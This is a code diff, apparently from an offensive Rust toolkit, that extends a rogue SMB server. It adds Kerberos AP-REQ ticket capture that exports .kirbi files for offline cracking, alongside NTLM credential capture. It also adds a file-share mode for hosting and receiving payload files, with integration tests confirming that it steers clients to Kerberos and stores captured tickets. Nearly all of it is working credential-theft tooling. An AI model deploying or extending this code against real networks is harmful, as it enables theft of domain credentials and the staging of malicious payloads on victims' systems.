         body[8..24].copy_from_slice(file_id);
-        let input_off = (64 + body.len() as u32 + 12) as u32; // after fixed fields and padding
+        let input_off = 64 + body.len() as u32 + 12; // after fixed fields and padding
         body[20..24].copy_from_slice(&input_off.to_le_bytes());
         body[24..28].copy_from_slice(&(input.len() as u32).to_le_bytes());
         body[32..36].copy_from_slice(&0u32.to_le_bytes()); // MaxInputResponse
@@ -1760,6 +2343,55 @@ impl SmbDaemon {
     // Credential capture
     // ===========================================================
 
+    /// krbrelayx parity: parse a Kerberos AP-REQ from the session-setup
+    /// security buffer and record the embedded ticket.
+    fn capture_kerberos_apreq(
+        sec_data: &[u8],
+        tickets: &Arc<Mutex<Vec<CapturedKerberosTicket>>>,
+        client_ip: &str,
+    ) -> Option<()> {
+        let apreq = crate::krb_capture::parse_ap_req(sec_data).ok()?;
+        let ticket = &apreq.ticket;
+        let kirbi = crate::krb_capture::build_kirbi(
+            &ticket.ticket_blob,
+            &ticket.realm,
+            &ticket.sname,
+            ticket.name_type,
+            None,
+            &[],
+            None,
+            0,
+        );
+        let is_tgt = ticket
+            .sname
+            .first()
+            .map(|s| s.eq_ignore_ascii_case("krbtgt"))
+            .unwrap_or(false);
+        info!(
+            "Kerberos capture: {} ticket {}@{} (etype {}, kvno {}) from {} -- .kirbi ready for offline decryption",
+            if is_tgt { "TGT" } else { "service" },
+            ticket.sname.join("/"),
+            ticket.realm,
+            ticket.etype,
+            ticket.kvno,
+            client_ip
+        );
+        let cap = CapturedKerberosTicket {
+            source: client_ip.to_string(),
+            apreq_raw: sec_data.to_vec(),
+            ticket_blob: ticket.ticket_blob.clone(),
+            realm: ticket.realm.clone(),
+            sname: ticket.sname.clone(),
+            name_type: ticket.name_type,
+            etype: ticket.etype,
+            kvno: ticket.kvno,
+            cipher: ticket.cipher.clone(),
+            kirbi,
+        };
+        tickets.lock().unwrap_or_else(|e| e.into_inner()).push(cap);
+        Some(())
+    }
+
     fn capture_ntlm_credentials(
         ntlmssp: &[u8],
         server_challenge: [u8; 8],
@@ -1889,11 +2521,7 @@ impl SmbDaemon {
     }
 
     fn filetime_now() -> u64 {
-        let now = std::time::SystemTime::now()
-            .duration_since(std::time::UNIX_EPOCH)
-            .unwrap_or_default();
-        let intervals = now.as_secs() * 10_000_000 + now.subsec_nanos() as u64 / 100;
-        intervals + 116_444_736_000_000_000
+        systemtime_to_filetime(std::time::SystemTime::now())
     }
 
     fn build_smb1_negotiate_response(challenge: [u8; 8], _target_name: &str) -> Vec<u8> {
@@ -2055,5 +2683,578 @@ mod tests {
         assert!(b > a);
         // Windows FILETIME for 2020+ is well above 0x01D4F0B0EBC00000
         assert!(a > 0x01D4_F0B0_EBC0_0000);
+    }
+
+    #[test]
+    fn systemtime_to_filetime_matches_epoch_offset() {
+        // 1970-01-01 == 11644473600_0000000 FILETIME
+        assert_eq!(
+            systemtime_to_filetime(std::time::UNIX_EPOCH),
+            116_444_736_000_000_000
+        );
+        // 1 second after epoch = base + 10_000_000 (100-ns units)
+        let t = std::time::UNIX_EPOCH + std::time::Duration::from_secs(1);
+        assert_eq!(systemtime_to_filetime(t), 116_444_736_010_000_000);
+    }
+
+    #[test]
+    fn resolve_share_path_valid_and_nested() {
+        let root = Path::new("/srv/share");
+        let p = SmbDaemon::resolve_share_path(root, "payload.dll");
+        assert_eq!(p, Some(PathBuf::from("/srv/share/payload.dll")));
+        let nested = SmbDaemon::resolve_share_path(root, r"sub\dir\tool.exe");
+        assert_eq!(nested, Some(PathBuf::from("/srv/share/sub/dir/tool.exe")));
+        // Leading backslash is stripped (UNC-style create name)
+        let unc = SmbDaemon::resolve_share_path(root, r"\payload.dll");
+        assert_eq!(unc, Some(PathBuf::from("/srv/share/payload.dll")));
+    }
+
+    #[test]
+    fn resolve_share_path_rejects_traversal_and_device_paths() {
+        let root = Path::new("/srv/share");
+        assert_eq!(SmbDaemon::resolve_share_path(root, ".."), None);
+        assert_eq!(SmbDaemon::resolve_share_path(root, r"..\..\evil.txt"), None);
+        assert_eq!(SmbDaemon::resolve_share_path(root, r"a\..\..\evil"), None);
+        assert_eq!(SmbDaemon::resolve_share_path(root, "C:evil.dll"), None);
+        // A UNC-style create name does not escape the share root: the leading
+        // backslashes are stripped and the path resolves inside the share.
+        assert_eq!(
+            SmbDaemon::resolve_share_path(root, r"\\attacker\share"),
+            Some(PathBuf::from("/srv/share/attacker/share"))
+        );
+    }
+
+    #[test]
+    fn glob_match_wildcards_and_case() {
+        assert!(SmbDaemon::glob_match("*", "anything.txt"));
+        assert!(SmbDaemon::glob_match("*.dll", "payload.dll"));
+        assert!(SmbDaemon::glob_match("*.DLL", "payload.dll"));
+        assert!(SmbDaemon::glob_match("pay*.dll", "payload.dll"));
+        assert!(SmbDaemon::glob_match("pay?oad", "payload"));
+        assert!(!SmbDaemon::glob_match("*.dll", "payload.exe"));
+        assert!(!SmbDaemon::glob_match("pay", "payload"));
+        assert!(SmbDaemon::glob_match("exact", "exact"));
+    }
+
+    // -----------------------------------------------------------
+    // FileShare mode integration: raw SMB2 client against SmbDaemon
+    // -----------------------------------------------------------
+
+    /// Build a raw SMB2 frame: NBSS header + SMB2 header + body.
+    fn smb2_frame(
+        command: u16,
+        message_id: u64,
+        session_id: u64,
+        tree_id: u32,
+        body: &[u8],
+    ) -> Vec<u8> {
+        let mut pkt = Vec::new();
+        pkt.push(0x00);
+        let total = SMB2_HEADER_SIZE + body.len();
+        pkt.extend_from_slice(&(total as u32).to_le_bytes()[1..4]);
+        pkt.extend_from_slice(SMB2_PROTOCOL);
+        pkt.extend_from_slice(&64u16.to_le_bytes()); // StructureSize
+        pkt.extend_from_slice(&0u16.to_le_bytes()); // CreditCharge
+        pkt.extend_from_slice(&0u32.to_le_bytes()); // Status
+        pkt.extend_from_slice(&command.to_le_bytes());
+        pkt.extend_from_slice(&1u16.to_le_bytes()); // Credits
+        pkt.extend_from_slice(&0u32.to_le_bytes()); // Flags
+        pkt.extend_from_slice(&0u32.to_le_bytes()); // NextCommand
+        pkt.extend_from_slice(&message_id.to_le_bytes());
+        pkt.extend_from_slice(&0u32.to_le_bytes()); // Reserved
+        pkt.extend_from_slice(&tree_id.to_le_bytes());
+        pkt.extend_from_slice(&session_id.to_le_bytes());
+        pkt.extend_from_slice(&[0u8; 16]); // Signature
+        pkt.extend_from_slice(body);
+        pkt
+    }
+
+    fn negotiate_body() -> Vec<u8> {
+        let mut b = Vec::new();
+        b.extend_from_slice(&36u16.to_le_bytes()); // StructureSize
+        b.push(0x00); // SecurityMode: no signing
+        b.push(0x00); // Reserved
+        b.extend_from_slice(&0u32.to_le_bytes()); // Capabilities
+        b.extend_from_slice(&[0x11; 16]); // ClientGuid
+        b.extend_from_slice(&0u32.to_le_bytes()); // NegotiateContextOffset
+        b.extend_from_slice(&0u16.to_le_bytes()); // NegotiateContextCount
+        b.extend_from_slice(&0u16.to_le_bytes()); // Reserved2
+        b.extend_from_slice(&1u16.to_le_bytes()); // DialectCount
+        b.extend_from_slice(&SMB2_DIALECT_202.to_le_bytes()); // 2.0.2
+        b
+    }
+
+    fn minimal_ntlmssp(msg_type: u32) -> Vec<u8> {
+        let mut m = Vec::new();
+        m.extend_from_slice(b"NTLMSSP\x00");
+        m.extend_from_slice(&msg_type.to_le_bytes());
+        m.extend_from_slice(&0u32.to_le_bytes()); // Flags
+        if msg_type == 3 {
+            // LM/LM len+off, NTLM len+off, domain, user, workstation,
+            // session key -- all zero-length fields for a synthetic blob
+            for _ in 0..6 {
+                m.extend_from_slice(&0u16.to_le_bytes());
+                m.extend_from_slice(&0u16.to_le_bytes());
+            }
+            m.extend_from_slice(&0u32.to_le_bytes()); // NegotiateFlags
+        }
+        m
+    }
+
+    fn session_setup_body(sec_data: &[u8]) -> Vec<u8> {
+        // NOTE: matches the daemon's parser (offset/len at body[4..8])
+        let mut b = Vec::new();
+        b.extend_from_slice(&9u16.to_le_bytes()); // StructureSize
+        b.push(0); // Flags
+        b.push(0); // SecurityMode
+        b.extend_from_slice(&((SMB2_HEADER_SIZE + 24) as u16).to_le_bytes()); // sec offset
+        b.extend_from_slice(&(sec_data.len() as u16).to_le_bytes()); // sec len
+        b.extend_from_slice(&0u32.to_le_bytes()); // Capabilities
+        b.extend_from_slice(&[0u8; 12]); // Channel + PreviousSessionId spare
+        b.extend_from_slice(sec_data);
+        b
+    }
+
+    fn tree_connect_body(share: &str) -> Vec<u8> {
+        let path_u16: Vec<u8> = share.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+        let mut b = Vec::new();
+        b.extend_from_slice(&9u16.to_le_bytes()); // StructureSize
+        b.extend_from_slice(&0u16.to_le_bytes()); // Reserved
+        b.extend_from_slice(&((SMB2_HEADER_SIZE + 8) as u16).to_le_bytes()); // PathOffset
+        b.extend_from_slice(&(path_u16.len() as u16).to_le_bytes());
+        b.extend_from_slice(&path_u16);
+        b
+    }
+
+    fn create_body(name: &str, disposition: u32, options: u32, desired_access: u32) -> Vec<u8> {
+        let name_u16: Vec<u8> = name.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+        let mut b = Vec::new();
+        b.extend_from_slice(&57u16.to_le_bytes()); // StructureSize
+        b.push(0); // OplockLevel
+        b.push(0); // SecurityFlags
+        b.extend_from_slice(&2u32.to_le_bytes()); // ImpersonationLevel
+        b.extend_from_slice(&0u64.to_le_bytes()); // SmbCreateFlags
+        b.extend_from_slice(&0u64.to_le_bytes()); // Reserved
+        b.extend_from_slice(&desired_access.to_le_bytes());
+        b.extend_from_slice(&0u32.to_le_bytes()); // FileAttributes
+        b.extend_from_slice(&0u32.to_le_bytes()); // ShareAccess
+        b.extend_from_slice(&disposition.to_le_bytes());
+        b.extend_from_slice(&options.to_le_bytes());
+        b.extend_from_slice(&((SMB2_HEADER_SIZE + 56) as u16).to_le_bytes()); // NameOffset
+        b.extend_from_slice(&(name_u16.len() as u16).to_le_bytes()); // NameLength
+        b.extend_from_slice(&0u32.to_le_bytes()); // CreateContextsOffset
+        b.extend_from_slice(&0u32.to_le_bytes()); // CreateContextsLength
+        b.extend_from_slice(&name_u16);
+        b
+    }
+
+    fn read_body(file_id: u64, offset: u64, len: u32) -> Vec<u8> {
+        let mut b = Vec::new();
+        b.extend_from_slice(&49u16.to_le_bytes()); // StructureSize
+        b.push(0); // Padding
+        b.push(0); // Reserved
+        b.extend_from_slice(&len.to_le_bytes()); // Length
+        b.extend_from_slice(&offset.to_le_bytes());
+        b.extend_from_slice(&file_id.to_le_bytes());
+        b.extend_from_slice(&0u32.to_le_bytes()); // MinimumCount
+        b.extend_from_slice(&0u32.to_le_bytes()); // Channel
+        b.extend_from_slice(&0u32.to_le_bytes()); // RemainingBytes
+        b
+    }
+
+    fn write_body(file_id: u64, offset: u64, payload: &[u8]) -> Vec<u8> {
+        let mut b = Vec::new();
+        b.extend_from_slice(&49u16.to_le_bytes()); // StructureSize
+        b.extend_from_slice(&((SMB2_HEADER_SIZE + 48) as u16).to_le_bytes()); // DataOffset
+        b.extend_from_slice(&(payload.len() as u32).to_le_bytes());
+        b.extend_from_slice(&offset.to_le_bytes());
+        b.extend_from_slice(&file_id.to_le_bytes());
+        b.extend_from_slice(&0u32.to_le_bytes()); // Channel
+        b.extend_from_slice(&0u32.to_le_bytes()); // RemainingBytes
+        while b.len() < 48 {
+            b.push(0);
+        }
+        b.extend_from_slice(payload);
+        b
+    }
+
+    fn close_body(file_id: u64) -> Vec<u8> {
+        // MS-SMB2 2.2.27: StructureSize(2), Flags(2), Reserved(4),
+        // FileId(16) -- persistent id occupies body[8..16].
+        let mut b = Vec::new();
+        b.extend_from_slice(&15u16.to_le_bytes()); // StructureSize
+        b.extend_from_slice(&0u16.to_le_bytes()); // Flags
+        b.extend_from_slice(&0u32.to_le_bytes()); // Reserved
+        b.extend_from_slice(&file_id.to_le_bytes()); // Persistent FileId
+        b.extend_from_slice(&file_id.to_le_bytes()); // Volatile FileId
+        b
+    }
+
+    fn query_directory_body(pattern: &str, info_class: u8) -> Vec<u8> {
+        let pat_u16: Vec<u8> = pattern
+            .encode_utf16()
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+        let mut b = Vec::new();
+        b.extend_from_slice(&33u16.to_le_bytes()); // StructureSize
+        b.push(info_class); // FileInformationClass
+        b.push(0); // Flags
+        b.extend_from_slice(&0u32.to_le_bytes()); // FileIndex
+        b.extend_from_slice(&[0u8; 16]); // FileId
+        b.extend_from_slice(&0u16.to_le_bytes()); // OutputBufferOffset
+        b.extend_from_slice(&65535u16.to_le_bytes()); // OutputBufferLength
+        b.extend_from_slice(&((SMB2_HEADER_SIZE + 32) as u16).to_le_bytes()); // NameOffset
+        b.extend_from_slice(&(pat_u16.len() as u16).to_le_bytes()); // NameLength
+        b.extend_from_slice(&pat_u16);
+        b
+    }
+
+    /// Read one NBSS-framed SMB2 response; returns (status, body).
+    async fn smb2_read_response(stream: &mut tokio::net::TcpStream) -> (u32, Vec<u8>) {
+        use tokio::io::AsyncReadExt;
+        let mut nb = [0u8; 4];
+        stream.read_exact(&mut nb).await.unwrap();
+        let len = u32::from_be_bytes([0, nb[1], nb[2], nb[3]]) as usize;
+        let mut rest = vec![0u8; len];
+        stream.read_exact(&mut rest).await.unwrap();
+        let status = u32::from_le_bytes([rest[8], rest[9], rest[10], rest[11]]);
+        (status, rest[SMB2_HEADER_SIZE..].to_vec())
+    }
+
+    #[tokio::test]
+    async fn file_share_full_flow_negotiate_to_directory_listing() {
+        use tokio::io::AsyncWriteExt;
+
+        let tmp = std::env::temp_dir().join(format!("ovt_smbshare_test_{}", rand::random::<u32>()));
+        std::fs::create_dir_all(&tmp).unwrap();
+        std::fs::write(tmp.join("hello.txt"), b"HELLO-PAYLOAD").unwrap();
+
+        let config = SmbDaemonConfig {
+            listen_ip: "127.0.0.1".into(),
+            listen_port: 0,
+            challenge: None,
+            mode: SmbDaemonMode::FileShare {
+                share_name: "payloads".into(),
+                share_root: tmp.clone(),
+            },
+            domain_name: "CORP".into(),
+            socks5_proxy: None,
+            capture_kerberos: false,
+            krb_relay_target: None,
+        };
+        let mut daemon = SmbDaemon::new(config);
+        daemon.start().await.unwrap();
+        let port = daemon.bound_port();
+        assert!(port > 0, "ephemeral port must be recorded");
+
+        let mut stream = tokio::net::TcpStream::connect(("127.0.0.1", port))
+            .await
+            .unwrap();
+
+        // -- NEGOTIATE -------------------------------------------------
+        let req = smb2_frame(SMB2_NEGOTIATE, 0, 0, 0, &negotiate_body());
+        stream.write_all(&req).await.unwrap();
+        let (status, _) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_SUCCESS);
+
+        // -- SESSION_SETUP leg 1 (Type 1) ------------------------------
+        let req = smb2_frame(
+            SMB2_SESSION_SETUP,
+            1,
+            0,
+            0,
+            &session_setup_body(&minimal_ntlmssp(1)),
+        );
+        stream.write_all(&req).await.unwrap();
+        let (status, _) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_MORE_PROCESSING_REQUIRED);
+
+        // -- SESSION_SETUP leg 2 (Type 3) ------------------------------
+        let req = smb2_frame(
+            SMB2_SESSION_SETUP,
+            2,
+            0,
+            0,
+            &session_setup_body(&minimal_ntlmssp(3)),
+        );
+        stream.write_all(&req).await.unwrap();
+        let (status, _) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_SUCCESS);
+
+        // -- TREE_CONNECT (any share name maps to the root) ------------
+        let req = smb2_frame(
+            SMB2_TREE_CONNECT,
+            3,
+            0,
+            0,
+            &tree_connect_body(r"\\127.0.0.1\payloads"),
+        );
+        stream.write_all(&req).await.unwrap();
+        let (status, body) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_SUCCESS);
+        assert_eq!(body[2], SHARE_TYPE_DISK);
+
+        // -- CREATE (open existing file for read) ----------------------
+        let req = smb2_frame(
+            SMB2_CREATE,
+            4,
+            0,
+            1,
+            &create_body("hello.txt", FILE_OPEN, 0, FILE_READ_DATA),
+        );
+        stream.write_all(&req).await.unwrap();
+        let (status, body) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_SUCCESS);
+        let read_id = u64::from_le_bytes(body[64..72].try_into().unwrap());
+
+        // -- READ the payload back -------------------------------------
+        let req = smb2_frame(SMB2_READ, 5, 0, 1, &read_body(read_id, 0, 4096));
+        stream.write_all(&req).await.unwrap();
+        let (status, body) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_SUCCESS);
+        let data_len = u32::from_le_bytes([body[4], body[5], body[6], body[7]]);
+        assert_eq!(data_len, 13);
+        assert_eq!(&body[16..16 + data_len as usize], b"HELLO-PAYLOAD");
+
+        // -- CLOSE -------------------------------------------------------
+        let req = smb2_frame(SMB2_CLOSE, 6, 0, 1, &close_body(read_id));
+        stream.write_all(&req).await.unwrap();
+        let (status, _) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_SUCCESS);
+
+        // -- CREATE + WRITE + CLOSE creates a file on disk ---------------
+        let req = smb2_frame(
+            SMB2_CREATE,
+            7,
+            0,
+            1,
+            &create_body("dropped.dll", FILE_OVERWRITE_IF, 0, FILE_WRITE_DATA),
+        );
+        stream.write_all(&req).await.unwrap();
+        let (status, body) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_SUCCESS);
+        let write_id = u64::from_le_bytes(body[64..72].try_into().unwrap());
+
+        let payload = b"MZ-dropped-payload";
+        let req = smb2_frame(SMB2_WRITE, 8, 0, 1, &write_body(write_id, 0, payload));
+        stream.write_all(&req).await.unwrap();
+        let (status, _) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_SUCCESS);
+
+        let req = smb2_frame(SMB2_CLOSE, 9, 0, 1, &close_body(write_id));
+        stream.write_all(&req).await.unwrap();
+        let (status, _) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_SUCCESS);
+        assert_eq!(std::fs::read(tmp.join("dropped.dll")).unwrap(), payload);
+
+        // -- QUERY_DIRECTORY lists both files ----------------------------
+        let req = smb2_frame(
+            SMB2_QUERY_DIRECTORY,
+            10,
+            0,
+            1,
+            &query_directory_body("*", FILE_DIRECTORY_INFORMATION_CLASS),
+        );
+        stream.write_all(&req).await.unwrap();
+        let (status, body) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_SUCCESS);
+        let blob = &body[8..];
+        let blob_text: Vec<u8> = blob
+            .chunks(2)
+            .flat_map(|c| {
+                if c.len() == 2 {
+                    vec![c[0], c[1]]
+                } else {
+                    vec![c[0]]
+                }
+            })
+            .collect();
+        let listing: String = String::from_utf16_lossy(
+            &blob[68..]
+                .chunks(2)
+                .map(|c| u16::from_le_bytes([c[0], c[1]]))
+                .collect::<Vec<_>>(),
+        );
+        assert!(listing.contains("hello.txt"), "listing: {}", listing);
+        let _ = blob_text;
+
+        // -- Path traversal is rejected ----------------------------------
+        let req = smb2_frame(
+            SMB2_CREATE,
+            11,
+            0,
+            1,
+            &create_body("..\\outside.txt", FILE_OVERWRITE_IF, 0, FILE_WRITE_DATA),
+        );
+        stream.write_all(&req).await.unwrap();
+        let (status, _) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_ACCESS_DENIED);
+        assert!(!tmp.parent().unwrap().join("outside.txt").exists());
+
+        daemon.stop();
+        let _ = std::fs::remove_dir_all(&tmp);
+    }
+
+    #[tokio::test]
+    async fn file_share_create_missing_file_open_returns_not_found() {
+        use tokio::io::AsyncWriteExt;
+
+        let tmp =
+            std::env::temp_dir().join(format!("ovt_smbshare_missing_{}", rand::random::<u32>()));
+        std::fs::create_dir_all(&tmp).unwrap();
+
+        let config = SmbDaemonConfig {
+            listen_ip: "127.0.0.1".into(),
+            listen_port: 0,
+            challenge: None,
+            mode: SmbDaemonMode::FileShare {
+                share_name: "s".into(),
+                share_root: tmp.clone(),
+            },
+            domain_name: "CORP".into(),
+            socks5_proxy: None,
+            capture_kerberos: false,
+            krb_relay_target: None,
+        };
+        let mut daemon = SmbDaemon::new(config);
+        daemon.start().await.unwrap();
+        let port = daemon.bound_port();
+        let mut stream = tokio::net::TcpStream::connect(("127.0.0.1", port))
+            .await
+            .unwrap();
+
+        let req = smb2_frame(SMB2_NEGOTIATE, 0, 0, 0, &negotiate_body());
+        stream.write_all(&req).await.unwrap();
+        let _ = smb2_read_response(&mut stream).await;
+
+        let req = smb2_frame(
+            SMB2_SESSION_SETUP,
+            1,
+            0,
+            0,
+            &session_setup_body(&minimal_ntlmssp(1)),
+        );
+        stream.write_all(&req).await.unwrap();
+        let _ = smb2_read_response(&mut stream).await;
+
+        let req = smb2_frame(
+            SMB2_SESSION_SETUP,
+            2,
+            0,
+            0,
+            &session_setup_body(&minimal_ntlmssp(3)),
+        );
+        stream.write_all(&req).await.unwrap();
+        let _ = smb2_read_response(&mut stream).await;
+
+        // Open a non-existent file -> OBJECT_NAME_NOT_FOUND
+        let req = smb2_frame(
+            SMB2_CREATE,
+            3,
+            0,
+            0,
+            &create_body("ghost.txt", FILE_OPEN, 0, FILE_READ_DATA),
+        );
+        stream.write_all(&req).await.unwrap();
+        let (status, _) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_OBJECT_NAME_NOT_FOUND);
+
+        daemon.stop();
+        let _ = std::fs::remove_dir_all(&tmp);
+    }
+
+    // -----------------------------------------------------------
+    // Kerberos capture mode integration (krbrelayx parity)
+    // -----------------------------------------------------------
+
+    #[tokio::test]
+    async fn kerberos_capture_full_flow_type1_to_apreq() {
+        use crate::krb_capture::testutil::build_test_apreq;
+        use crate::krb_capture::{KRB5_MECH_OID_TLV, find};
+        use tokio::io::AsyncWriteExt;
+
+        let config = SmbDaemonConfig {
+            listen_ip: "127.0.0.1".into(),
+            listen_port: 0,
+            challenge: None,
+            mode: SmbDaemonMode::Capture,
+            domain_name: "CORP".into(),
+            socks5_proxy: None,
+            capture_kerberos: true,
+            krb_relay_target: None,
+        };
+        let mut daemon = SmbDaemon::new(config);
+        daemon.start().await.unwrap();
+        let port = daemon.bound_port();
+        assert!(port > 0, "ephemeral port must be recorded");
+
+        let mut stream = tokio::net::TcpStream::connect(("127.0.0.1", port))
+            .await
+            .unwrap();
+
+        // -- NEGOTIATE -------------------------------------------------
+        let req = smb2_frame(SMB2_NEGOTIATE, 0, 0, 0, &negotiate_body());
+        stream.write_all(&req).await.unwrap();
+        let (status, _) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_SUCCESS);
+
+        // -- SESSION_SETUP leg 1: krb5 mech must be advertised ---------
+        let req = smb2_frame(
+            SMB2_SESSION_SETUP,
+            1,
+            0,
+            0,
+            &session_setup_body(&minimal_ntlmssp(1)),
+        );
+        stream.write_all(&req).await.unwrap();
+        let (status, body) = smb2_read_response(&mut stream).await;
+        assert_eq!(status, STATUS_MORE_PROCESSING_REQUIRED);
+        assert!(
+            find(&body, KRB5_MECH_OID_TLV).is_some(),
+            "daemon must steer the client to the krb5 SASL mech"
+        );
+
+        // -- SESSION_SETUP leg 2: AP-REQ in the security buffer --------
+        let apreq = build_test_apreq();
+        let req = smb2_frame(SMB2_SESSION_SETUP, 2, 0, 0, &session_setup_body(&apreq));
+        stream.write_all(&req).await.unwrap();
+        let (status, _) = smb2_read_response(&mut stream).await;
+        assert_eq!(
+            status, STATUS_SUCCESS,
+            "AP-REQ accept completes the SASL leg"
+        );
+
+        // The ticket must be captured with full metadata + kirbi blob
+        let tickets = daemon.get_captured_tickets();
+        assert_eq!(tickets.len(), 1, "exactly one ticket captured");
+        let t = &tickets[0];
+        assert_eq!(t.realm, "CORP.LOCAL");
+        assert_eq!(t.sname, vec!["cifs", "dc.corp.local"]);
+        assert_eq!(t.name_type, 2);
+        assert_eq!(t.etype, 18);
+        assert_eq!(t.kvno, 2);
+        assert_eq!(t.cipher.len(), 100);
+        assert!(!t.kirbi.is_empty(), "kirbi (KRB-CRED) must be built");
+        assert_eq!(t.apreq_raw, apreq);
+
+        // A NTLMSSP Type 1 in capture mode still works (mixed vinum flow)
+        let req = smb2_frame(
+            SMB2_SESSION_SETUP,
+            3,
+            0,
+            0,
+            &session_setup_body(&minimal_ntlmssp(1)),
+        );
+        let mut stream2 = tokio::net::TcpStream::connect(("127.0.0.1", port))
+            .await
+            .unwrap();
+        let req_frame = req;
+        stream2.write_all(&req_frame).await.unwrap();
+        let (status, body2) = smb2_read_response(&mut stream2).await;
+        assert_eq!(status, STATUS_MORE_PROCESSING_REQUIRED);
+        // capture mode: the response advertises krb5, not an NTLM challenge
+        assert!(find(&body2, KRB5_MECH_OID_TLV).is_some());
+
+        daemon.stop();
     }
 }
